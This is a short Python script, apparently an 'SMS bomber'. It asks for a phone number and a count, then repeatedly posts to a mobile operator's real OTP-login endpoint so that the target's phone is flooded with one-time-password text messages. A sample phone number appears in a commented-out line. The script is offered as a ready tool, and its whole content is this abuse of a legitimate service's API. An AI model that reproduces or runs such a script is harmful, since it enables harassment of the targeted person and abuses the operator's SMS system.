color_off="\033[0m"       # Text Reset

# Regular Colors
black="\033[0;30m"        # Black
red="\033[0;31m"          # Red
green="\033[0;32m"        # Green
yellow="\033[0;33m"       # Yellow
blue="\033[0;34m"         # Blue
purple="\033[0;35m"       # Purple
cyan="\033[0;36m"         # Cyan
white="\033[0;37m"        # White
ublack="\033[4;30m"       # Black

#Tool


import requests

# POST 

myblapi="https://assetliteapi.banglalink.net/api/v1/user/otp-login/request"

'''number={'mobile':'01928371454'}'''
number=str(input(cyan+" Enter Your Number : "+color_off))

amount=int(input(cyan+" Enter The Amount : "+color_off))
for i in range(amount):
	requests.post(myblapi,data=number)
	print(green+str(i+1)+" ★ ✔ SMS Sent ")